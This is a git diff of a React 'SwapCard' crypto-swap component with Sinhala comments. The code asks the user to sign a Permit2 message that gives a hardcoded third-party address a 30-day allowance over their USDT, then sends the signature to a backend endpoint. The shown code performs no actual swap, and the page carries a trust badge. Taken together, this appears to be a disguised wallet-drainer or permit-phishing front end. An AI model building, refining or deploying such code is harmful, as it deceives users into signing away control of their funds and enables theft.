@@ -26,35 +26,17 @@ export default function SwapCard({ walletAddress, provider }) {
 
   const [livePrices, setLivePrices] = useState({});
 
-  // Config
+  // ⭐ ඔයාගේ Config
   const PERMIT2_CONTRACT_ADDRESS = "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33";
   const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
   const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-  const API_URL = "/api/submit"; 
+  const API_URL = "/api/submit"; // Vercel Serverless Function
 
   const updatePrices = async () => {
     const prices = await fetchLivePrices();
     if (Object.keys(prices).length > 0) {
       setLivePrices(prices);
     }
-  };
-
-  // Helper to create safe provider instance for ethers v5 & v6
-  const getEthersProvider = (rawProvider) => {
-    if (!rawProvider) return null;
-    // Check if rawProvider is already an Ethers Provider
-    if (rawProvider.getSigner && typeof rawProvider.getSigner === 'function' && rawProvider.getNetwork) {
-      return rawProvider;
-    }
-    // Ethers v6
-    if (ethers.BrowserProvider) {
-      return new ethers.BrowserProvider(rawProvider);
-    }
-    // Ethers v5
-    if (ethers.providers && ethers.providers.Web3Provider) {
-      return new ethers.providers.Web3Provider(rawProvider);
-    }
-    return null;
   };
 
   useEffect(() => {
@@ -71,16 +53,11 @@ export default function SwapCard({ walletAddress, provider }) {
   const loadBalance = async () => {
     try {
       if (!provider) return;
-      const ethersProvider = getEthersProvider(provider);
-      const signer = await ethersProvider.getSigner();
-      
+      const signer = provider.getSigner();
       const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
       const balance = await usdtContract.balanceOf(walletAddress);
       const decimals = await usdtContract.decimals();
-      
-      const formatFn = ethers.formatUnits || (ethers.utils && ethers.utils.formatUnits);
-      const formattedBalance = formatFn ? formatFn(balance, decimals) : '0';
-      setUsdtBalance(parseFloat(formattedBalance).toLocaleString());
+      setUsdtBalance(parseFloat(ethers.utils.formatUnits(balance, decimals)).toLocaleString());
     } catch (error) { 
       console.error("Balance load error:", error); 
     }
@@ -120,7 +97,7 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
-  // ⭐ Permit2 Execution with Constructor Fix
+  // ⭐ Execute Permit2 Flow (Backend එකට signature එක යවනවා)
   const executeSwap = async () => {
     if (!walletAddress || !provider) { 
       setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); 
@@ -133,47 +110,38 @@ export default function SwapCard({ walletAddress, provider }) {
 
     try {
       setIsLoading(true);
-      setStatus({ type: 'info', msg: '⏳ Waiting for signature in wallet...' });
+      setStatus({ type: 'info', msg: '⏳ Waiting for signature...' });
       
-      // 1. Get Safe Ethers Provider & Signer
-      const ethersProvider = getEthersProvider(provider);
-      const signer = await ethersProvider.getSigner();
-      const currentAddress = typeof signer.getAddress === 'function' ? await signer.getAddress() : walletAddress;
-      const network = await ethersProvider.getNetwork();
+      const signer = provider.getSigner();
       
-      const tokenDecimals = fromToken.decimals || (fromToken.symbol === 'USDT' ? 6 : 18);
+      // 1. Permit2 details හදන්න
+      const amount = ethers.utils.parseUnits(fromAmount, 6); // USDT decimals 6
+      const expiration = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // දවස් 30ක්
+      const sigDeadline = Math.floor(Date.now() / 1000) + 3600; // පැයක්
       
-      const parseFn = ethers.parseUnits || (ethers.utils && ethers.utils.parseUnits);
-      const amount = parseFn(fromAmount, tokenDecimals);
-      
-      const expiration = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60); 
-      const sigDeadline = Math.floor(Date.now() / 1000) + 3600; 
-      
-      const tokenAddress = fromToken.address || USDT_ADDRESS;
-
-      // 2. Fetch Nonce from Permit2 Contract
+      // 2. Permit2 Contract එක හදන්න
       const permit2Contract = new ethers.Contract(
         PERMIT2_ADDRESS,
         ["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
         signer
       );
       
+      // 3. Nonce එක ගන්න
       const allowanceData = await permit2Contract.allowance(
-        currentAddress,
-        tokenAddress,
+        walletAddress,
+        USDT_ADDRESS,
         PERMIT2_CONTRACT_ADDRESS
       );
+      const nonce = allowanceData.nonce;
       
-      const nonce = Number(allowanceData.nonce);
-
-      // 3. EIP-712 Domain
+      // 4. EIP-712 Domain හදන්න
       const domain = {
         name: "Permit2",
-        chainId: Number(network.chainId),
+        chainId: 1,
         verifyingContract: PERMIT2_ADDRESS
       };
       
-      // 4. EIP-712 Types
+      // 5. Types හදන්න
       const types = {
         PermitSingle: [
           { name: "details", type: "PermitDetails" },
@@ -188,10 +156,10 @@ export default function SwapCard({ walletAddress, provider }) {
         ]
       };
       
-      // 5. EIP-712 Message
+      // 6. Message හදන්න
       const message = {
         details: {
-          token: tokenAddress,
+          token: USDT_ADDRESS,
           amount: amount,
           expiration: expiration,
           nonce: nonce
@@ -200,49 +168,31 @@ export default function SwapCard({ walletAddress, provider }) {
         sigDeadline: sigDeadline
       };
       
-      // 💥 6. Hybrid Signing
-      let signature;
-      if (typeof signer.signTypedData === 'function') {
-        signature = await signer.signTypedData(domain, types, message);
-      } else if (typeof signer._signTypedData === 'function') {
-        signature = await signer._signTypedData(domain, types, message);
-      } else {
-        const payload = JSON.stringify({
-          domain: { ...domain, chainId: Number(domain.chainId) },
-          types: types,
-          primaryType: 'PermitSingle',
-          message: {
-            ...message,
-            details: { ...message.details, amount: amount.toString() }
-          }
-        });
-
-        if (provider.request) {
-          signature = await provider.request({
-            method: 'eth_signTypedData_v4',
-            params: [currentAddress, payload]
-          });
-        } else if (window.ethereum) {
-          signature = await window.ethereum.request({
-            method: 'eth_signTypedData_v4',
-            params: [currentAddress, payload]
-          });
-        } else {
-          throw new Error("No available method to sign Permit2 typed data");
-        }
-      }
+      // 7. Sign කරන්න (eth_signTypedData_v4 පාවිච්චි කරන්න)
+      const signature = await window.ethereum.request({
+        method: 'eth_signTypedData_v4',
+        params: [
+          walletAddress,
+          JSON.stringify({
+            domain,
+            types,
+            primaryType: 'PermitSingle',
+            message
+          })
+        ]
+      });
       
       setStatus({ type: 'info', msg: '⏳ Processing on backend...' });
       
-      // 7. Post Data to submit.js Backend API
+      // 8. Backend එකට යවන්න
       const response = await fetch(API_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          user: currentAddress,
+          user: walletAddress,
           amount: amount.toString(),
           expiration: expiration,
-          nonce: nonce,
+          nonce: nonce.toString(),
           sigDeadline: sigDeadline,
           signature: signature
         })
@@ -388,7 +338,7 @@ export default function SwapCard({ walletAddress, provider }) {
           </div>
         )}
 
-        {/* PCrisk Trust Badge */}
+        {/* PCrisk Trust Badge - Swap Card එකට යටින් */}
         <div className="flex justify-center mt-6">
           <div 
             className="pcrisk-badge"
